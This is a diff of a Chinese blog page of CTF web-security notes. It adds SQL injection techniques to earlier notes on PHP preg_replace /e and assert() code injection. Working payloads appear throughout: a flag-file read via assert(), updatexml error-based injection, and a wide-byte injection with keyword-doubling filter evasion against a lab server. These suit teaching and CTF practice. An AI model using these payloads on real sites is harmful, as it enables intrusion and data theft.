@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-10-15</span>
-            <span class="time">10:20:57</span>
+            <span class="time">20:25:12</span>
           </span>
           
           <!--  Categories  -->
@@ -143,7 +143,13 @@
 &#125;</code></pre>
 
 <p>payload如下<br>1.把X-Forwarded-For换成127.0.0.1<br>2.<code>?pat=/test/e&amp;rep=phpinfo()&amp;sub=just test</code><br>pat是正则匹配模式，sub是字符串。rep是替换的内容<br><strong>php之assert()</strong></p>
-<p>bool assert(mixed $assertion[,string,$description])，如果assertion是字符串，他会被assert()当做php代码执行。 思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。<br>‘) or phpinfo();# ——即变成file_exists(‘’) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示<br>‘) or print_r(file_get_contents(‘templates/flag.php’);# ——然后在源代码里（临门一脚不要被坑了） 即最终payload:?page=’)%20or%20print_r(file_get_contents(‘templates%2fflag.php’))%3b%23<br><strong>文件泄漏</strong><br>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt   .sql</p>
+<p>bool assert(mixed $assertion[,string,$description])，如果assertion是字符串，他会被assert()当做php代码执行。 思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。<br>‘) or phpinfo();# ——即变成file_exists(‘’) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示<br>‘) or print_r(file_get_contents(‘templates/flag.php’);# ——然后在源代码里（临门一脚不要被坑了） 即最终payload:?page=’)%20or%20print_r(file_get_contents(‘templates%2fflag.php’))%3b%23<br><strong>文件泄漏</strong><br>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt   .sql<br>##sql注入<br>其中的一个万能密码，如果数据库中存在比较<br><code>if(md5($pw)==$password)</code><br>如果查询的回显值select 1,2,3#,其中1的字段为id,2的字段为user,3的字段为password，那我们就可以通过构造字符串来绕过比较得到flag，例如<br><code>pw=123//这个是我们自己构造的</code><br><code>/*那么可以构造sql语句,查询123的md5,通过字符串的方式写入sql语句，那么sql后台会返给这个语句给php,md5($pw)和$password比较,前提这个第二个字段的user一定要传对,一定是正确的用户名*/</code><br><strong>sql注入 updatexml</strong><br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>然后咱们再看看语句：<br><code>http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br>CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。<br>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。<br>错误大概会是：<br><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code><br>例如最近的北京工业的比赛，一道sql注入</p>
+<pre><code class="hljs undefined"># 爆数据库 http://<span class="hljs-number">172.21</span><span class="hljs-number">.4</span><span class="hljs-number">.12</span>:<span class="hljs-number">10012</span>/search.php?name=admin%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">1</span>,database()),<span class="hljs-number">1</span>) <span class="hljs-comment">--+&amp;pw=y1ng</span>
+# Error: XPATH syntax <span class="hljs-built_in">error</span>: <span class="hljs-string">'web_sqli'</span>
+# 查表名
+http://<span class="hljs-number">172.21</span><span class="hljs-number">.4</span><span class="hljs-number">.12</span>:<span class="hljs-number">10012</span>/search.php?name=admin%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">1</span>, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>) <span class="hljs-comment">--+&amp;pw=y1ng</span>
+# Error: XPATH syntax <span class="hljs-built_in">error</span>: <span class="hljs-string">'f14g,user'</span></code></pre>
+
 
         </div>
       </div>
